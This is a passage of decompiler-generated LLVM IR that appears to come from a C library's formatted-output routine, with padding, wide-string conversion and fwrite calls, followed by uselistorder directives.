  %v2_805ce75 = add i32 %v3_805ce71, %v0_805ce75
  store i32 %v2_805ce75, i32* %eax.global-to-local, align 4
  %v1_805ce78 = inttoptr i32 %v0_805ce71 to i32*
  %v2_805ce78 = load i32, i32* %v1_805ce78, align 4
  %v4_805ce78 = add i32 %v2_805ce78, %v2_805ce75
  %v15_805ce78 = icmp slt i32 %v4_805ce78, 0
  store i1 %v15_805ce78, i1* %sf.global-to-local, align 1
  store i32 %v4_805ce78, i32* %v1_805ce78, align 4
  %v0_805ce7b = load i32, i32* @esp, align 4
  %v1_805ce7b = add i32 %v0_805ce7b, 7
  %v2_805ce7b = inttoptr i32 %v1_805ce7b to i8*
  %v3_805ce7b = load i8, i8* %v2_805ce7b, align 1
  %v4_805ce7b = add i8 %v3_805ce7b, -48
  %v9_805ce7b = icmp eq i8 %v4_805ce7b, 0
  %v10_805ce7b = icmp slt i8 %v4_805ce7b, 0
  store i1 %v10_805ce7b, i1* %sf.global-to-local, align 1
  %v1_805ce80 = icmp eq i1 %v9_805ce7b, false
  br i1 %v1_805ce80, label %dec_label_pc_805ce8c, label %dec_label_pc_805ce82

dec_label_pc_805ce82:                             ; preds = %dec_label_pc_805ce71
  %v0_805ce82 = load i32, i32* @ebx, align 4
  %v1_805ce82 = load i32, i32* @ecx, align 4
  %v2_805ce82 = add i32 %v1_805ce82, %v0_805ce82
  %v13_805ce82 = icmp slt i32 %v2_805ce82, 0
  store i1 %v13_805ce82, i1* %sf.global-to-local, align 1
  store i32 %v2_805ce82, i32* @ebx, align 4
  %v1_805ce84 = add i32 %v0_805ce7b, 8
  %v2_805ce84 = inttoptr i32 %v1_805ce84 to i32*
  store i32 0, i32* %v2_805ce84, align 4
  %v0_805ce8c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ce8c

dec_label_pc_805ce8c:                             ; preds = %dec_label_pc_805ce71, %dec_label_pc_805ce82
  %v0_805ce93 = phi i32 [ %v0_805ce7b, %dec_label_pc_805ce71 ], [ %v0_805ce8c.pre, %dec_label_pc_805ce82 ]
  %v1_805ce8c = add i32 %v0_805ce93, 32
  %v2_805ce8c = inttoptr i32 %v1_805ce8c to i8*
  %v3_805ce8c = load i8, i8* %v2_805ce8c, align 1
  %v4_805ce8c = and i8 %v3_805ce8c, 8
  %v5_805ce8c = icmp eq i8 %v4_805ce8c, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_805ce91 = icmp eq i1 %v5_805ce8c, false
  br i1 %v1_805ce91, label %dec_label_pc_805ceba, label %dec_label_pc_805ce93

dec_label_pc_805ce93:                             ; preds = %dec_label_pc_805ce8c
  %v1_805ce93 = add i32 %v0_805ce93, 8
  %v2_805ce93 = inttoptr i32 %v1_805ce93 to i32*
  %v3_805ce93 = load i32, i32* %v2_805ce93, align 4
  store i32 %v3_805ce93, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805ce9c = add i32 %v0_805ce93, 368
  %v2_805ce9c = inttoptr i32 %v1_805ce9c to i32*
  %v3_805ce9c = load i32, i32* %v2_805ce9c, align 4
  store i32 %v3_805ce9c, i32* @eax, align 4
  %v0_805cea3 = call i32 @_charpad()
  store i32 %v0_805cea3, i32* %eax.global-to-local, align 4
  %v1_805cea8 = load i32, i32* @esp, align 4
  %v2_805cea8 = add i32 %v1_805cea8, 8
  %v3_805cea8 = inttoptr i32 %v2_805cea8 to i32*
  %v4_805cea8 = load i32, i32* %v3_805cea8, align 4
  %v5_805cea8 = sub i32 %v0_805cea3, %v4_805cea8
  %v15_805cea8 = icmp eq i32 %v5_805cea8, 0
  %v16_805cea8 = icmp slt i32 %v5_805cea8, 0
  store i1 %v16_805cea8, i1* %sf.global-to-local, align 1
  %v1_805ceac = icmp eq i1 %v15_805cea8, false
  br i1 %v1_805ceac, label %dec_label_pc_805cfa7, label %dec_label_pc_805ceb2

dec_label_pc_805ceb2:                             ; preds = %dec_label_pc_805ce93
  store i32 0, i32* %v3_805cea8, align 4
  %v1_805ceba.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805ceba

dec_label_pc_805ceba:                             ; preds = %dec_label_pc_805ce8c, %dec_label_pc_805ceb2
  %v1_805ceba = phi i32 [ %v0_805ce93, %dec_label_pc_805ce8c ], [ %v1_805ceba.pre, %dec_label_pc_805ceb2 ]
  %v0_805ceba = load i32, i32* %eax.global-to-local, align 4
  %v2_805ceba = add i32 %v1_805ceba, -4
  %v3_805ceba = inttoptr i32 %v2_805ceba to i32*
  store i32 %v0_805ceba, i32* %v3_805ceba, align 4
  %v0_805cebb = load i32, i32* %eax.global-to-local, align 4
  %v2_805cebb = add i32 %v1_805ceba, -8
  %v3_805cebb = inttoptr i32 %v2_805cebb to i32*
  store i32 %v0_805cebb, i32* %v3_805cebb, align 4
  %v1_805cebc = add i32 %v1_805ceba, 368
  %v2_805cebc = inttoptr i32 %v1_805cebc to i32*
  %v3_805cebc = load i32, i32* %v2_805cebc, align 4
  %v5_805cebc = add i32 %v1_805ceba, -12
  %v6_805cebc = inttoptr i32 %v5_805cebc to i32*
  store i32 %v3_805cebc, i32* %v6_805cebc, align 4
  %v0_805cec3 = load i32, i32* @ebp, align 4
  %v1_805cec3 = add i32 %v0_805cec3, ptrtoint (i32* @global_var_806d8f9.650 to i32)
  store i32 %v1_805cec3, i32* %eax.global-to-local, align 4
  %v2_805cec9 = add i32 %v1_805ceba, -16
  %v3_805cec9 = inttoptr i32 %v2_805cec9 to i32*
  store i32 %v1_805cec3, i32* %v3_805cec9, align 4
  %v0_805ceca = load i32, i32* %stack_var_-364, align 4
  %v4_805ceca = inttoptr i32 %v0_805ceca to i8*
  %v5_805ceca = call i32 @__GI_fputs_unlocked(i8* %v4_805ceca, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_805ceca, i32* %eax.global-to-local, align 4
  %v0_805cecf = load i32, i32* @esp, align 4
  %v1_805cecf = add i32 %v0_805cecf, 384
  %v2_805cecf = inttoptr i32 %v1_805cecf to i32*
  %v3_805cecf = load i32, i32* %v2_805cecf, align 4
  store i32 %v3_805cecf, i32* @eax, align 4
  %v0_805ced6 = load i32, i32* @ebx, align 4
  store i32 %v0_805ced6, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_805cedd = call i32 @_charpad()
  store i32 %v0_805cedd, i32* %eax.global-to-local, align 4
  %v0_805cee2 = load i32, i32* @esp, align 4
  %v1_805cee2 = add i32 %v0_805cee2, 16
  %v1_805cee5 = load i32, i32* @ebx, align 4
  %v2_805cee5 = sub i32 %v0_805cedd, %v1_805cee5
  %v12_805cee5 = icmp eq i32 %v2_805cee5, 0
  %v13_805cee5 = icmp slt i32 %v2_805cee5, 0
  store i1 %v13_805cee5, i1* %sf.global-to-local, align 1
  %v1_805cee7 = icmp eq i1 %v12_805cee5, false
  br i1 %v1_805cee7, label %dec_label_pc_805cfa7, label %dec_label_pc_805ceed

dec_label_pc_805ceed:                             ; preds = %dec_label_pc_805ceba
  %v1_805ceed = add i32 %v0_805cee2, 356
  %v2_805ceed = inttoptr i32 %v1_805ceed to i32*
  %v3_805ceed = load i32, i32* %v2_805ceed, align 4
  %v4_805ceed = icmp eq i32 %v3_805ceed, 0
  %v5_805ceed = icmp slt i32 %v3_805ceed, 0
  store i1 %v5_805ceed, i1* %sf.global-to-local, align 1
  %v1_805cef5 = icmp eq i1 %v4_805ceed, false
  br i1 %v1_805cef5, label %dec_label_pc_805cf19, label %dec_label_pc_805cef7

dec_label_pc_805cef7:                             ; preds = %dec_label_pc_805ceed
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805cef9 = load i32, i32* @esi, align 4
  %v1_805cef9 = icmp eq i32 %v0_805cef9, 0
  %v2_805cef9 = icmp slt i32 %v0_805cef9, 0
  store i1 %v2_805cef9, i1* %sf.global-to-local, align 1
  br i1 %v1_805cef9, label %dec_label_pc_805cf0f, label %dec_label_pc_805cefd

dec_label_pc_805cefd:                             ; preds = %dec_label_pc_805cef7
  %v2_805cefd = add i32 %v0_805cee2, 12
  %v3_805cefd = inttoptr i32 %v2_805cefd to i32*
  store i32 0, i32* %v3_805cefd, align 4
  %v1_805cefe = add i32 %v0_805cee2, 384
  %v2_805cefe = inttoptr i32 %v1_805cefe to i32*
  %v3_805cefe = load i32, i32* %v2_805cefe, align 4
  %v5_805cefe = add i32 %v0_805cee2, 8
  %v6_805cefe = inttoptr i32 %v5_805cefe to i32*
  store i32 %v3_805cefe, i32* %v6_805cefe, align 4
  %v0_805cf05 = load i32, i32* @esi, align 4
  %v2_805cf05 = add i32 %v0_805cee2, 4
  %v3_805cf05 = inttoptr i32 %v2_805cf05 to i32*
  store i32 %v0_805cf05, i32* %v3_805cf05, align 4
  %v0_805cf06 = load i32, i32* @edi, align 4
  %v3_805cf06 = inttoptr i32 %v0_805cee2 to i32*
  store i32 %v0_805cf06, i32* %v3_805cf06, align 4
  %v0_805cf07 = load i32, i32* %stack_var_-364, align 4
  %v4_805cf07 = call i32 @__stdio_fwrite(i32 %v0_805cf07, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805cf07, i32* %eax.global-to-local, align 4
  %v0_805cf0c = load i32, i32* @esp, align 4
  %v1_805cf0c = add i32 %v0_805cf0c, 16
  %v7_805cf0c = icmp slt i32 %v1_805cf0c, 0
  store i1 %v7_805cf0c, i1* %sf.global-to-local, align 1
  %v1_805cf0f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805cf0f

dec_label_pc_805cf0f:                             ; preds = %dec_label_pc_805cef7, %dec_label_pc_805cefd
  %v0_805cf7948 = phi i32 [ %v1_805cee2, %dec_label_pc_805cef7 ], [ %v1_805cf0c, %dec_label_pc_805cefd ]
  %v1_805cf0f = phi i32 [ 0, %dec_label_pc_805cef7 ], [ %v1_805cf0f.pre, %dec_label_pc_805cefd ]
  %v0_805cf0f = phi i32 [ 0, %dec_label_pc_805cef7 ], [ %v4_805cf07, %dec_label_pc_805cefd ]
  %v2_805cf0f = sub i32 %v0_805cf0f, %v1_805cf0f
  %v12_805cf0f = icmp eq i32 %v2_805cf0f, 0
  %v13_805cf0f = icmp slt i32 %v2_805cf0f, 0
  store i1 %v13_805cf0f, i1* %sf.global-to-local, align 1
  %v1_805cf11 = icmp eq i1 %v12_805cf0f, false
  br i1 %v1_805cf11, label %dec_label_pc_805cfa7, label %dec_label_pc_805cf79

dec_label_pc_805cf19:                             ; preds = %dec_label_pc_805ceed
  %v1_805cf19 = add i32 %v0_805cee2, 348
  %v2_805cf19 = inttoptr i32 %v1_805cf19 to i32*
  store i32 0, i32* %v2_805cf19, align 4
  %v0_805cf7510 = load i32, i32* @esi, align 4
  %v1_805cf7511 = icmp eq i32 %v0_805cf7510, 0
  %v2_805cf7512 = icmp slt i32 %v0_805cf7510, 0
  store i1 %v2_805cf7512, i1* %sf.global-to-local, align 1
  %v1_805cf7718 = icmp eq i1 %v1_805cf7511, false
  %v0_805cf26.pre = load i32, i32* @esp, align 4
  br i1 %v1_805cf7718, label %dec_label_pc_805cf26, label %dec_label_pc_805cf79

dec_label_pc_805cf26:                             ; preds = %dec_label_pc_805cf19, %dec_label_pc_805cf73
  %v0_805cf2d = phi i32 [ %v2_805cf73, %dec_label_pc_805cf73 ], [ %v0_805cf7510, %dec_label_pc_805cf19 ]
  %v1_805cf38 = phi i32 [ %v0_805cf2643, %dec_label_pc_805cf73 ], [ %v0_805cf26.pre, %dec_label_pc_805cf19 ]
  %v1_805cf26 = add i32 %v1_805cf38, 332
  store i32 %v1_805cf26, i32* %edx.global-to-local, align 4
  %v1_805cf2d = add i32 %v0_805cf2d, -128
  %v2_805cf2d = icmp ult i32 %v0_805cf2d, 128
  %v6_805cf2d = icmp eq i32 %v1_805cf2d, 0
  %v7_805cf2d = icmp slt i32 %v1_805cf2d, 0
  store i1 %v7_805cf2d, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_805cf38 = add i32 %v1_805cf38, -4
  %v3_805cf38 = inttoptr i32 %v2_805cf38 to i32*
  store i32 %v1_805cf26, i32* %v3_805cf38, align 4
  %v2_805cf39 = or i1 %v2_805cf2d, %v6_805cf2d
  %v3_805cf39 = load i32, i32* %eax.global-to-local, align 4
  %v4_805cf39 = load i32, i32* @esi, align 4
  %v5_805cf39 = select i1 %v2_805cf39, i32 %v4_805cf39, i32 %v3_805cf39
  %v2_805cf3c = add i32 %v1_805cf38, -8
  %v3_805cf3c = inttoptr i32 %v2_805cf3c to i32*
  store i32 %v5_805cf39, i32* %v3_805cf3c, align 4
  %v1_805cf3d = add i32 %v1_805cf38, 340
  store i32 %v1_805cf3d, i32* %eax.global-to-local, align 4
  %v2_805cf44 = add i32 %v1_805cf38, -12
  %v3_805cf44 = inttoptr i32 %v2_805cf44 to i32*
  store i32 %v1_805cf3d, i32* %v3_805cf44, align 4
  %v1_805cf45 = add i32 %v1_805cf38, 204
  store i32 %v1_805cf45, i32* @edi, align 4
  %v2_805cf4c = add i32 %v1_805cf38, -16
  %v3_805cf4c = inttoptr i32 %v2_805cf4c to i32*
  store i32 %v1_805cf45, i32* %v3_805cf4c, align 4
  %v0_805cf4d = call i32 @__GI_wcsrtombs()
  %v0_805cf52 = load i32, i32* @esp, align 4
  %v1_805cf52 = add i32 %v0_805cf52, 16
  store i32 %v0_805cf4d, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805cf59 = icmp eq i32 %v0_805cf4d, 0
  %v2_805cf59 = icmp slt i32 %v0_805cf4d, 0
  store i1 %v2_805cf59, i1* %sf.global-to-local, align 1
  br i1 %v1_805cf59, label %dec_label_pc_805cf6f, label %dec_label_pc_805cf5d

dec_label_pc_805cf5d:                             ; preds = %dec_label_pc_805cf26
  %v0_805cf5d = load i32, i32* @ebp, align 4
  %v2_805cf5d = add i32 %v0_805cf52, 12
  %v3_805cf5d = inttoptr i32 %v2_805cf5d to i32*
  store i32 %v0_805cf5d, i32* %v3_805cf5d, align 4
  %v1_805cf5e = add i32 %v0_805cf52, 384
  %v2_805cf5e = inttoptr i32 %v1_805cf5e to i32*
  %v3_805cf5e = load i32, i32* %v2_805cf5e, align 4
  %v5_805cf5e = add i32 %v0_805cf52, 8
  %v6_805cf5e = inttoptr i32 %v5_805cf5e to i32*
  store i32 %v3_805cf5e, i32* %v6_805cf5e, align 4
  %v2_805cf65 = add i32 %v0_805cf52, 4
  %v3_805cf65 = inttoptr i32 %v2_805cf65 to i32*
  store i32 %v0_805cf4d, i32* %v3_805cf65, align 4
  %v0_805cf66 = load i32, i32* @edi, align 4
  %v3_805cf66 = inttoptr i32 %v0_805cf52 to i32*
  store i32 %v0_805cf66, i32* %v3_805cf66, align 4
  %v0_805cf67 = load i32, i32* %stack_var_-364, align 4
  %v4_805cf67 = call i32 @__stdio_fwrite(i32 %v0_805cf67, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_805cf67, i32* %eax.global-to-local, align 4
  %v0_805cf6c = load i32, i32* @esp, align 4
  %v1_805cf6c = add i32 %v0_805cf6c, 16
  %v7_805cf6c = icmp slt i32 %v1_805cf6c, 0
  store i1 %v7_805cf6c, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_805cf6f

dec_label_pc_805cf6f:                             ; preds = %dec_label_pc_805cf26, %dec_label_pc_805cf5d
  %v1_805cf73 = phi i32 [ 0, %dec_label_pc_805cf26 ], [ %v4_805cf67, %dec_label_pc_805cf5d ]
  %v0_805cf2643 = phi i32 [ %v1_805cf52, %dec_label_pc_805cf26 ], [ %v1_805cf6c, %dec_label_pc_805cf5d ]
  %v2_805cf6f = sub i32 %v1_805cf73, %v0_805cf4d
  %v12_805cf6f = icmp eq i32 %v2_805cf6f, 0
  %v13_805cf6f = icmp slt i32 %v2_805cf6f, 0
  store i1 %v13_805cf6f, i1* %sf.global-to-local, align 1
  %v1_805cf71 = icmp eq i1 %v12_805cf6f, false
  br i1 %v1_805cf71, label %dec_label_pc_805cfa7, label %dec_label_pc_805cf73

dec_label_pc_805cf73:                             ; preds = %dec_label_pc_805cf6f
  %v0_805cf73 = load i32, i32* @esi, align 4
  %v2_805cf73 = sub i32 %v0_805cf73, %v1_805cf73
  %v12_805cf73 = icmp eq i32 %v2_805cf73, 0
  %v13_805cf73 = icmp slt i32 %v2_805cf73, 0
  store i32 %v2_805cf73, i32* @esi, align 4
  store i1 %v13_805cf73, i1* %sf.global-to-local, align 1
  %v1_805cf77 = icmp eq i1 %v12_805cf73, false
  br i1 %v1_805cf77, label %dec_label_pc_805cf26, label %dec_label_pc_805cf79

dec_label_pc_805cf79:                             ; preds = %dec_label_pc_805cf73, %dec_label_pc_805cf19, %dec_label_pc_805cf0f
  %v0_805cf79 = phi i32 [ %v0_805cf7948, %dec_label_pc_805cf0f ], [ %v0_805cf26.pre, %dec_label_pc_805cf19 ], [ %v0_805cf2643, %dec_label_pc_805cf73 ]
  %v1_805cf79 = add i32 %v0_805cf79, 8
  %v2_805cf79 = inttoptr i32 %v1_805cf79 to i32*
  %v3_805cf79 = load i32, i32* %v2_805cf79, align 4
  store i32 %v3_805cf79, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_805cf82 = add i32 %v0_805cf79, 368
  %v2_805cf82 = inttoptr i32 %v1_805cf82 to i32*
  %v3_805cf82 = load i32, i32* %v2_805cf82, align 4
  store i32 %v3_805cf82, i32* @eax, align 4
  %v0_805cf89 = call i32 @_charpad()
  store i32 %v0_805cf89, i32* %eax.global-to-local, align 4
  %v1_805cf8e = load i32, i32* @esp, align 4
  %v2_805cf8e = add i32 %v1_805cf8e, 8
  %v3_805cf8e = inttoptr i32 %v2_805cf8e to i32*
  %v4_805cf8e = load i32, i32* %v3_805cf8e, align 4
  %v5_805cf8e = sub i32 %v0_805cf89, %v4_805cf8e
  %v15_805cf8e = icmp eq i32 %v5_805cf8e, 0
  %v16_805cf8e = icmp slt i32 %v5_805cf8e, 0
  store i1 %v16_805cf8e, i1* %sf.global-to-local, align 1
  %v1_805cf92 = icmp eq i1 %v15_805cf8e, false
  br i1 %v1_805cf92, label %dec_label_pc_805cfa7, label %dec_label_pc_805cf94

dec_label_pc_805cf94:                             ; preds = %dec_label_pc_805cf79, %dec_label_pc_805cd01, %dec_label_pc_805cb2c
  %v0_805cf94 = phi i32 [ %v1_805cf8e, %dec_label_pc_805cf79 ], [ %v0_805cf94.pre, %dec_label_pc_805cd01 ], [ %v1_805cb4a, %dec_label_pc_805cb2c ]
  %v1_805cf94 = add i32 %v0_805cf94, 16
  %v2_805cf94 = inttoptr i32 %v1_805cf94 to i32*
  %v3_805cf94 = load i32, i32* %v2_805cf94, align 4
  store i32 %v3_805cf94, i32* @ebx, align 4
  store i32 %v3_805cf94, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805ca84.backedge

dec_label_pc_805cf9f:                             ; preds = %dec_label_pc_805cac2
  %v1_805cf9f = add i32 %v0_805cf9f, 2
  %v10_805cf9f = icmp slt i32 %v1_805cf9f, 0
  store i1 %v10_805cf9f, i1* %sf.global-to-local, align 1
  store i32 %v1_805cf9f, i32* @ebx, align 4
  br label %dec_label_pc_805ca84.backedge

dec_label_pc_805cfa7:                             ; preds = %dec_label_pc_805caae, %dec_label_pc_805cf79, %dec_label_pc_805cf0f, %dec_label_pc_805ceba, %dec_label_pc_805ce93, %dec_label_pc_805ce03, %dec_label_pc_805cd76, %dec_label_pc_805cd37, %dec_label_pc_805ccd8, %dec_label_pc_805cf6f
  %v0_805cfa7 = phi i32 [ %v0_805cf2643, %dec_label_pc_805cf6f ], [ %v0_805cfa7.pre.pre, %dec_label_pc_805caae ], [ %v1_805cf8e, %dec_label_pc_805cf79 ], [ %v0_805cf7948, %dec_label_pc_805cf0f ], [ %v1_805cee2, %dec_label_pc_805ceba ], [ %v1_805cea8, %dec_label_pc_805ce93 ], [ %v0_805cb24.lcssa, %dec_label_pc_805ce03 ], [ %v1_805cd8e, %dec_label_pc_805cd76 ], [ %v1_805cd5a, %dec_label_pc_805cd37 ], [ %v1_805ccf6, %dec_label_pc_805ccd8 ]
  %v1_805cfa7 = inttoptr i32 %v0_805cfa7 to i32*
  store i32 -1, i32* %v1_805cfa7, align 4
  br label %dec_label_pc_805cfae

dec_label_pc_805cfae:                             ; preds = %dec_label_pc_805cab9, %dec_label_pc_805ca27, %dec_label_pc_805ca46, %dec_label_pc_805cfa7
  %v0_805cfae = load i32, i32* @esp, align 4
  %v1_805cfae = inttoptr i32 %v0_805cfae to i32*
  %v2_805cfae = load i32, i32* %v1_805cfae, align 4
  store i32 %v2_805cfae, i32* %eax.global-to-local, align 4
  %v1_805cfb1 = add i32 %v0_805cfae, 348
  %v10_805cfb1 = icmp slt i32 %v1_805cfb1, 0
  store i1 %v10_805cfb1, i1* %sf.global-to-local, align 1
  %v3_805cfb8 = add i32 %v0_805cfae, 356
  %v1_805cfb9 = inttoptr i32 %v3_805cfb8 to i32*
  %v2_805cfb9 = load i32, i32* %v1_805cfb9, align 4
  store i32 %v2_805cfb9, i32* @edi, align 4
  %v3_805cfb9 = add i32 %v0_805cfae, 360
  %v1_805cfba = inttoptr i32 %v3_805cfb9 to i32*
  %v2_805cfba = load i32, i32* %v1_805cfba, align 4
  store i32 %v2_805cfba, i32* @ebp, align 4
  ret i32 %v2_805cfae

; uselistorder directives
  uselistorder i32 %v1_805cf9f, { 1, 2, 0 }
  uselistorder i32 %v3_805cf94, { 2, 3, 0, 1 }
  uselistorder i32 %v0_805cf79, { 1, 0 }
  uselistorder i32 %v2_805cf73, { 1, 2, 3, 0 }
  uselistorder i32 %v0_805cf52, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805cf4d, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_805cf2d, { 1, 0 }
  uselistorder i32 %v0_805cf26.pre, { 1, 0 }
  uselistorder i32 %v0_805cef9, { 1, 0 }
  uselistorder i32 %v3_805ceed, { 1, 0 }
  uselistorder i32 %v0_805cee2, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_805ceba, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805ce93, { 0, 2, 1, 3 }
  uselistorder i8 %v4_805ce7b, { 1, 0 }
  uselistorder i32 %v2_805ce67, { 1, 0, 2, 3 }
  uselistorder i32 %v6_805ce54, { 1, 0 }
  uselistorder i32 %v1_805ce51, { 1, 0 }
  uselistorder i32 %v1_805ce47, { 1, 0 }
  uselistorder i32 %v0_805ce47, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805ce26, { 1, 0 }
  uselistorder i32 %v1_805ce03, { 1, 0 }
  uselistorder i32 %v1_805cdc1, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_805cddd, { 3, 2, 1, 0 }
  uselistorder i32 %v1_805cda6, { 1, 0 }
  uselistorder i32 %v1_805cd91, { 1, 0 }
  uselistorder i32 %v1_805cd5d, { 1, 0 }
  uselistorder i32 %v0_805cd37, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_805cd1d, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v1_805cd09, { 1, 0 }
  uselistorder i32 %v1_805ccbf, { 1, 0 }
  uselistorder i32 %v4_805cc8d, { 1, 0 }
  uselistorder i32 %v0_805cc82, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805cc7d, { 1, 0 }
  uselistorder i32 %v0_805ccb6, { 1, 0, 2, 3 }
  uselistorder i8 %v3_805cc6d, { 1, 0 }
  uselistorder i32 %v1_805cc64, { 1, 0 }
  uselistorder i32 %v1_805cc58, { 1, 0 }
  uselistorder i32 %v3_805cc4c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_805cc42, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_805cc3d, { 0, 1, 3, 2, 5, 4, 6 }
  uselistorder i32 %v2_805cc3b, { 1, 0 }
  uselistorder i32 %v0_805cc8d, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_805cc7d, { 1, 2, 0 }
  uselistorder i32 %v3_805cc15, { 0, 1, 3, 2 }
  uselistorder i8 %v4_805cc03, { 1, 0 }
  uselistorder i32 %v4_805cbfa, { 1, 0 }
  uselistorder i32 %v3_805cbfa, { 1, 0 }
  uselistorder i32 %v6_805cbf2, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 %v0_805cbc3, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v1_805cbc2, { 2, 1, 0 }
  uselistorder i32 %v1_805cb9b, { 1, 0 }
  uselistorder i32 %v1_805cb8f, { 1, 0 }
  uselistorder i32 %v1_805cb8a, { 1, 0 }
  uselistorder i32 %v2_805cb82, { 1, 0 }
  uselistorder i32 %tmp70, { 1, 0 }
  uselistorder i32 %v3_805cb6c, { 1, 0, 2 }
  uselistorder i8 %v3_805cb5b, { 1, 2, 0, 3 }
  uselistorder i32 %v1_805cb52, { 1, 0 }
  uselistorder i32 %v3_805cb24, { 9, 5, 2, 3, 4, 7, 8, 13, 12, 6, 16, 10, 0, 1, 11, 14, 15, 17, 18, 19 }
  uselistorder i32 %v0_805cb24.lcssa, { 0, 8, 9, 7, 6, 10, 26, 25, 13, 14, 15, 16, 17, 18, 12, 11, 21, 20, 19, 24, 23, 22, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_805cb20, { 1, 0 }
  uselistorder i32 %v1_805cb20.pre, { 1, 0 }
  uselistorder i32 %v1_805cb1f, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_805cb1c, { 1, 0 }
  uselistorder i32 %v2_805cb2074, { 1, 0 }
  uselistorder i32 %v3_805cb06, { 1, 0 }
  uselistorder i8 %v4_805cac2, { 1, 0 }
  uselistorder i32 %v1_805cac2, { 1, 0, 3, 2 }
  uselistorder i8 %v2_805cab9, { 1, 0 }
  uselistorder i32 %v2_805ca8e, { 0, 2, 1, 3, 4 }
  uselistorder i8 %v2_805ca8a, { 1, 0 }
  uselistorder i8 %v2_805ca84, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805ca92, { 0, 1, 3, 2 }
  uselistorder i32 %v0_805ca74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 5, 4, 8, 0, 7, 6, 3, 9, 10, 11, 12 }
  uselistorder i1* %sf.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 88, 86, 89, 90, 91, 92, 93, 94 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 12, 11, 13, 14, 19, 15, 16, 17, 20, 18, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0, 1, 2, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 356, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -15, { 1, 0 }
  uselistorder i32 204, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_805cfae, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_805cfa7, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_805cf6f, { 1, 0 }
  uselistorder label %dec_label_pc_805cf26, { 1, 0 }
  uselistorder label %dec_label_pc_805cf0f, { 1, 0 }
  uselistorder label %dec_label_pc_805ceba, { 1, 0 }
  uselistorder label %dec_label_pc_805ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_805ce71, { 1, 0 }
  uselistorder label %dec_label_pc_805ce5b, { 1, 0 }
  uselistorder label %dec_label_pc_805ce47, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805ce42, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805cdd4, { 1, 0 }
  uselistorder label %dec_label_pc_805cdba, { 1, 0 }
  uselistorder label %dec_label_pc_805ccd8, { 1, 0 }
  uselistorder label %dec_label_pc_805cc7d, { 5, 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805cc2b, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805cbdb, { 1, 0 }
  uselistorder label %dec_label_pc_805cbc2, { 1, 0 }
  uselistorder label %dec_label_pc_805cbae, { 1, 0 }
  uselistorder label %dec_label_pc_805cba9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805cb8a, { 1, 0 }
